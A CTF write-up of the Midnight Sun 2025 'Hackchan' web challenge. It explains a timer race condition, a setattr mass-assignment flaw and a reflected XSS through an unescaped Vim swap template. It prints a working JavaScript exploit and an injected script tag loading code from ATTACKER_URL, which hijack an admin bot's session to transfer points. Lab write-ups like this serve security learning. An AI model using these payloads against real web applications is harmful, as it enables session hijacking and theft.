---
title: "Hackchan - Midnight Sun CTF 2025 Quals"
category: "web"
subcategory: "race"
type: "writeup"
tags: ["web", "flask", "race-condition", "xss", "jinja2", "hackchan", "race", "midnight-sun-ctf-2025-quals", "2025", "ctf-writeup"]
summary: "![Zimzi's avatar](https://substack.com/@zimzi)"
source:
  name: "CTFtime writeup #40252"
  url: "https://ctftime.org/writeup/40252"
original_source: "https://zimzi.substack.com/p/midnight-sun-ctf-2025-quals-hackchan"
ctf:
  name: "Midnight Sun CTF 2025 Quals"
  year: 2025
  challenge: "Hackchan"
---

## Metadata

- **CTF:** Midnight Sun CTF 2025 Quals
- **Task:** Hackchan
- **Author team:** Gimel
- **CTFtime tags:** flask, race-condition, xss
- **CTFtime:** <https://ctftime.org/writeup/40252>
- **Original writeup:** <https://zimzi.substack.com/p/midnight-sun-ctf-2025-quals-hackchan>

---
# Midnight Sun CTF 2025 Quals - Hackchan 

### XSS, race condition, flask 

[![Zimzi's avatar](https://substackcdn.com/image/fetch/$s_!7J0a!,w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba6ea3a0-f2af-45ce-9f5d-82bf420f4890_1024x1024.png)](https://substack.com/@zimzi)

[Zimzi](https://substack.com/@zimzi)

May 27, 2025

Share

# Overview

The task includes:

  * [a source code](https://github.com/zimzimzi/CTFs/tree/main/midnight_2025/hackchan),

  * a web page.


Let's take an overview of the webpage functionalities:

  * registration/login:


[![](https://substackcdn.com/image/fetch/$s_!Z0zO!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8723d99-d1f9-4bf9-9ffb-6f944e0c7583_570x416.png)](https://substackcdn.com/image/fetch/$s_!Z0zO!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8723d99-d1f9-4bf9-9ffb-6f944e0c7583_570x416.png)

  * welcome page:

[![](https://substackcdn.com/image/fetch/$s_!fYPi!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F30c86675-bd4e-4d0d-a710-cacdfb83c02d_1600x490.png)](https://substackcdn.com/image/fetch/$s_!fYPi!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F30c86675-bd4e-4d0d-a710-cacdfb83c02d_1600x490.png)


  * shop, with a possibility to:

    * add products:

[![](https://substackcdn.com/image/fetch/$s_!ihQp!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5f698e2-3e8d-477c-9851-15268ee218c6_1057x525.png)](https://substackcdn.com/image/fetch/$s_!ihQp!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5f698e2-3e8d-477c-9851-15268ee218c6_1057x525.png)

    * checkout:

[![](https://substackcdn.com/image/fetch/$s_!rV6Y!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F780db97b-3b01-4763-801b-5969def23c32_1059x512.png)](https://substackcdn.com/image/fetch/$s_!rV6Y!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F780db97b-3b01-4763-801b-5969def23c32_1059x512.png)

    * report an order:

[![](https://substackcdn.com/image/fetch/$s_!VrGg!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b005735-dbcb-449f-8a1e-35333b1d4fb7_1046x296.png)](https://substackcdn.com/image/fetch/$s_!VrGg!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3b005735-dbcb-449f-8a1e-35333b1d4fb7_1046x296.png)


  * there is also a system of loyalty points that you can transfer to different users:

[![](https://substackcdn.com/image/fetch/$s_!kOyc!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F702879fd-a966-48a6-be92-5f13f5a7cd7f_1422x449.png)](https://substackcdn.com/image/fetch/$s_!kOyc!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F702879fd-a966-48a6-be92-5f13f5a7cd7f_1422x449.png)

  * an innocent faq:

[![](https://substackcdn.com/image/fetch/$s_!FfRz!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F94f409a7-01c4-464c-8c23-5594d1e4be7f_1030x775.png)](https://substackcdn.com/image/fetch/$s_!FfRz!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F94f409a7-01c4-464c-8c23-5594d1e4be7f_1030x775.png)


The source code overview with the most important modules and files:

[![](https://substackcdn.com/image/fetch/$s_!Oh2f!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b05d654-0e04-4efe-ac62-0ead369be3d7_885x598.png)](https://substackcdn.com/image/fetch/$s_!Oh2f!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b05d654-0e04-4efe-ac62-0ead369be3d7_885x598.png)

**Backend Application (Flask)**

  * views.py: Contains routing logic. It handles what happens when a user interacts with the app — logging in, registering, browsing products, using the cart, placing orders, reporting problems, and sending loyalty points. It works with the database, processes forms, and shows the right templates.

  * models.py: Models with entities like User, Product, Order, Transaction, etc.

  * templates/: Jinja2 templates for login, cart, FAQ, transactions, etc.

  * others


**Database Schema**

It includes entities like:

  * Users (with roles and balance).

  * Products and Orders.

  * Order Items and Problems.

  * Transactions (with pending/confirmed/rejected status) - for loyalty points transfer.


**FAQ Recommendation System**

  * It picks the most relevant answer page based on the meaning of the user's question using natural language processing.


**Admin Automation Bot**

  * Auto-login as manager.

  * Periodically checks and resolves order problems.


# Aim

The goal of the challenge is to get 999999999 loyalty points as a regular user.

_fragment of view.py:_

```
             case '**delete-account-and-get-flag** ':
                    if current_user.balance >= 999_999_999 and not current_user.is_manager and not current_user.is_admin:
    
                        current_user.remove()
                        db.session.commit()
                        flash('midnight{********REDACTED********}', 'success')
                    return redirect('/')
```

The manager starts with the amount of the loyalty points that we need:

_fragment of init.sql_

```
    INSERT INTO users (username, password, is_manager, balance) VALUES
        ('manager', '********REDACTED********', true, 999999999999);
```

In short, we need to XSS the manager to transfer loyalty points to a regular user account that we control. We also need to bypass check that limits transaction size to 10. Then, we can buy the flag.

# Code

## Loyalty point transfer

When we create a transaction, it is sent to the server this way:

[![](https://substackcdn.com/image/fetch/$s_!uvka!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa44547e9-8458-4cbc-a65f-344a75c7a2c7_374x313.png)](https://substackcdn.com/image/fetch/$s_!uvka!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa44547e9-8458-4cbc-a65f-344a75c7a2c7_374x313.png)

```
    curl 'URL?action=create-transaction' \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -b 'session=...
    ...
      --data-raw 'recipient=doxdoxdox&amount=1' \
```

Second, the record in the database is created or updated by:

```
    Transaction.update_or_create(current_user.id, form_data)
```

_*In models.py `Transaction` entity is responsible for handling loyalty points._

Next, it is handled by two timers, one calls the function `confirm_transaction` and the second calls the function `send_transaction`.

As we see in the below screenshot, only transactions for less than or exactly 10 points are automatically transferred between accounts; the higher ones are in the eternal state `pending-manual-check`.

[![](https://substackcdn.com/image/fetch/$s_!gKOG!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F76549ef5-a774-4d79-8c03-45c440617ebd_993x268.png)](https://substackcdn.com/image/fetch/$s_!gKOG!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F76549ef5-a774-4d79-8c03-45c440617ebd_993x268.png)

If you could just get the transaction into `confirmed` state and edit later...

# Race condition

 _*In the below text, when I mention a function call, I mean the whole construct of calling a function with a timer._

The timers confirm_transaction and send_transaction are not synchronous. The first runs every 0.1 seconds, and the second 0.13 seconds.

We may be able to use this gap to update transaction:

  1. create a small small transaction (1 point) process by the function `update_or_create`,

  2. the status is updated to `confirmed' by the timer `confirm_transaction` <\- the only function that checks if transaction is not bigger than 10 points to process it automatically,

  3. the `send_transaction` queries for `confirmed' transactions

  4. update a transaction for a bigger sum (999999999999 points) with the function `update_or_create`

  5. the `send_transaction` transfers updated points to the user.


_fragment of view.py_

```
     def **confirm_transaction**():
        with app.app_context():
            pending_transactions = Transaction.query.filter(Transaction.status == 'pending').all()
            for transaction in pending_transactions:
                if transaction.amount <= 10:
                    transaction.status = 'confirmed'
                else:
                    transaction.status = 'pending-manual-check'
            db.session.commit()
    
    scheduler.add_job(id='confirm_transaction', **func=confirm_transaction** , trigger="interval", seconds=0.1)
    
    def **send_transaction**():
        with app.app_context():
            confirmed_transactions = Transaction.query.filter(Transaction.status == 'confirmed').all()
    
            for transaction in confirmed_transactions:
                sender = User.query.get(transaction.sender_id)
                recipient = User.query.get(transaction.recipient_id)
                if sender and recipient:
                    if sender.balance >= transaction.amount:
                        transaction.status = 'sent'
                        if not sender.is_manager:
                            sender.balance -= transaction.amount
                        recipient.balance += transaction.amount
                    else:
                        transaction.status = 'rejected'
            db.session.commit()
    
    scheduler.add_job(id='send_transaction', **func=send_transaction** , trigger="interval", seconds=0.13)
```

But how to update the transaction for the given amount?

As we can see that all user provided data in POST request data in `create-transaction` are pass through to the `update_or_create` as `form_data`:

_fragment of 'create-transaction' from view.py_ :

```
    form_data = dict(request.form)
    form_data['amount'] = amount
    del form_data['recipient']
    form_data['recipient_id'] = recipient.id
    transaction = Transaction.update_or_create(current_user.id, form_data)
```

The code updates an existing transaction with `setattr`, so we can update the amount of points too!

* * *

_setattr(object, attribute_name, value)_

_The built-in Python function setattr() is used to set or update the value of an attribute on an object dynamically._

_What it does:_

  * _It sets the attribute on the given object to the specified value._

  * _If the attribute does not exist, it creates it._

  * _If it already exists, it updates its value._


* * *

_fragment of `update_or_create`_

```
     if transaction_id:
                del data['status']
                existing_transaction = cls.query.get(transaction_id)
                if existing_transaction:
                    if existing_transaction.sender_id == sender_id:
                        for key, value in data.items():
                            **setattr**(existing_transaction, key, value)
```

So, the updated plan for the exploit is to send two transactions. First, a normal transaction with a given `id`. Then, find the `id` in the HTML file with the transaction. Next, send the second request with the given `id` and 999999999999 points.

```
    await fetch(txURL, {
          method:'POST',
          body:`recipient=OUR_USER&amount=999999999&transaction_id=213`,
          ...
    });
```

We can send the transaction for an amount higher than 10 points, but only from the manager account. We still need a way for the manager to do this transaction for us.

# XSS

Let's take a closer look at how the bot works.

We can run a Docker instance from source code and see the manager view.

The manager has an additional tab named `Problems`:

[![](https://substackcdn.com/image/fetch/$s_!rvpD!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff364a2b7-17d3-45fb-bf52-e49a000b5ace_948x346.png)](https://substackcdn.com/image/fetch/$s_!rvpD!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff364a2b7-17d3-45fb-bf52-e49a000b5ace_948x346.png)

The bot logs for the manager account. It opens `Problem view`:

[![](https://substackcdn.com/image/fetch/$s_!izXh!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4445b904-e567-41f2-b8eb-f2a9002255cf_877x443.png)](https://substackcdn.com/image/fetch/$s_!izXh!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4445b904-e567-41f2-b8eb-f2a9002255cf_877x443.png)

We can take a closer look at how the bot processes it. It looks for the URLs that start with 'http://web:8000' and visits them. It seems we need to find the subpage when it is possible to inject the script...

_the fragment of `bot.js`:_

```
    const problemDescription = await page.locator('xpath=//body//div//p[1]').innerText();
          const homeOrigin = new URL(page.url()).origin;
          const problemWords = problemDescription.split(' ');
    
          for (const word of problemWords) {
            const urlPattern = /^http:\/\/web:8000\//;
            if (urlPattern.test(word) && word !== homeOrigin) {
              const currentProblem = page.url()
              await page.goto(word);
              await page.waitForTimeout(2000);
              await page.goto(currentProblem);
            }
          }
```

The templates look genuinely safe.

But there is one non-standard file: `.intermediaries.html.swp`. This is a temporary file created by Vim that contains some binary data, but also a Jinja2 template, similar to other files. Jinja templates in Flask have a surprising feature, according to the [docs](https://flask.palletsprojects.com/en/stable/templating/):

> _Jinja Setup_
> 
>  _Unless customized, Jinja2 is configured by Flask as follows:_
> 
> _autoescaping is enabled for all templates ending in .html, .htm, .xml, .xhtml, as well as .svg when using render_template()._

Well, `autoescaping` default configuration doesn't escape the non-web files like `.intermediaries.html.swp`.

How to produce a question that points to this file?

Let's look at the faq.

It uses TF-IDF language processing to match the best question. The files of the templates are named the same as the labels. In the code, we can see that we need the label that is a substring of the word `.intermediaries`.

One such label is `media.`

_fragment of view.py_

```
     faq_data = [
    ...,
    {"question": "How can I leave feedback or a review?", "label": "feedback"},
        {"question": "Do you have a press kit available that includes company logos and release templates?", "label": "media"},
        {"question": "How do I manage my subscription preferences?", "label": "subscription"},
    ...]
    
    ...
    
    listdir = sorted(os.listdir('templates/faq/answers'))
                        for file in listdir:
                            **if label in file:**
                                template = '/faq/answers/' + file
                                context['question'] = question
                                break
```

We can submit the question:

[![](https://substackcdn.com/image/fetch/$s_!4LZj!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F971e5257-ffb2-46af-8836-49765c585063_1059x252.png)](https://substackcdn.com/image/fetch/$s_!4LZj!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F971e5257-ffb2-46af-8836-49765c585063_1059x252.png)

It results redirects us to:

URL/?action=faq&question=Do+you+have+a+press+kit+available+that+includes+company+logos+and+release+templates%3F

[![](https://substackcdn.com/image/fetch/$s_!UGZ4!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb6e3cbf3-f825-4fd9-8379-24a35f22c3e5_827x307.png)](https://substackcdn.com/image/fetch/$s_!UGZ4!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb6e3cbf3-f825-4fd9-8379-24a35f22c3e5_827x307.png)

If we append our exploit the question, the cosine similarity still be the highest for the label `media`.

URL/?action=faq&question=Do+you+have+a+press+kit+available+that+includes+company+logos+and+release+templates%3Cscript%3Ealert(1)%3C/script%3E%3F

[![](https://substackcdn.com/image/fetch/$s_!M4-M!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3d39aec9-97b4-40e9-9c9e-58e8832ab159_744x393.png)](https://substackcdn.com/image/fetch/$s_!M4-M!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3d39aec9-97b4-40e9-9c9e-58e8832ab159_744x393.png)

So we can add the script with the source from our attacker server.

## Solution

We have all the elements to solve the challenge:

  1. prepare the URL on our server with the code that makes the race condition,

  2. prepare the link to faq with the link with source of the exploit,

  3. report the order with link to the faq,

  4. wait for the race condition to occur

  5. buy a flag.


The race condition code that runs on attacker server:

```
    const user  = 'doxdoxdox';
    const txURL = '/?action=create-transaction';
    const list  = '/?action=transactions-list';
    const hdr   = { 'Content-Type':'application/x-www-form-urlencoded' };
    
    let busy = false;
    
    setInterval(async () => {
      if (busy) return;        // skip tick if the previous one is still running
      busy = true;
    
      try {
        await fetch(txURL, {
          method:'POST',
          headers:hdr,
          body:`recipient=${user}&amount=1`,
          credentials:'include'
        });
    
        await new Promise(r => setTimeout(r, 30));      // let the row appear
    
        const html = await (await fetch(list,{credentials:'include'})).text();
        const doc  = new DOMParser().parseFromString(html,'text/html');
        const ids  = [...doc.querySelectorAll('tr')]
                       .filter(tr => tr.cells[2]?.textContent.trim() === user)
                       .map(tr => +tr.cells[0].textContent.trim());
    
        if (!ids.length) return console.log('no rows for', user);
        const id = Math.max(...ids);
    
        await fetch(txURL, {
          method:'POST',
          headers:hdr,
          body:`recipient=${user}&amount=999999999&transaction_id=${id}`,
          credentials:'include'
        });
    
        console.log('confirmed id', id);
      } finally {
        busy = false;
      }
    }, 500);    
```

The prepared URL:

URL/?action=faq&question=Do+you+have+a+press+kit+available+that+includes+company+logos+and+release+templates%3Cscript%20src=%22ATTACKER_URL/a.js%22%3E%3C/script%3E

Next, give the URL to the bot.

[![](https://substackcdn.com/image/fetch/$s_!cQqo!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcbb038e8-5bc3-4616-aa61-9af80f4d88f9_928x675.png)](https://substackcdn.com/image/fetch/$s_!cQqo!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcbb038e8-5bc3-4616-aa61-9af80f4d88f9_928x675.png)

We paste the URL a few times to increase the chance of a race condition.

[![](https://substackcdn.com/image/fetch/$s_!7Q9q!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff106026f-a737-470b-aa37-d897cc87ef44_966x825.png)](https://substackcdn.com/image/fetch/$s_!7Q9q!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff106026f-a737-470b-aa37-d897cc87ef44_966x825.png)

[![](https://substackcdn.com/image/fetch/$s_!5Ixi!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fda008051-a9c6-483a-9a9e-c70a955e9d8f_472x221.png)](https://substackcdn.com/image/fetch/$s_!5Ixi!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fda008051-a9c6-483a-9a9e-c70a955e9d8f_472x221.png)

Finally, we get the flag:

[![](https://substackcdn.com/image/fetch/$s_!OSpC!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F06477ce2-d2c7-4153-a9d0-b732e06e2acd_925x631.png)](https://substackcdn.com/image/fetch/$s_!OSpC!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F06477ce2-d2c7-4153-a9d0-b732e06e2acd_925x631.png)

Happy hacking, bye-bye!

Thanks for reading CTFs! Subscribe for free to receive new posts and support my work.

# **Reading recommendations**

  * [Bench Press: Leaking Text Nodes with CSS](https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/)

  * [Practical CTF - A huge collection web techniques](https://book.jorianwoltjer.com/)

  * [XS-Leaks wiki](https://xsleaks.dev/)


Great Twitter account to be up-to-date with fresh XSS attacks:

  * [slonser_](https://x.com/slonser_)


Share
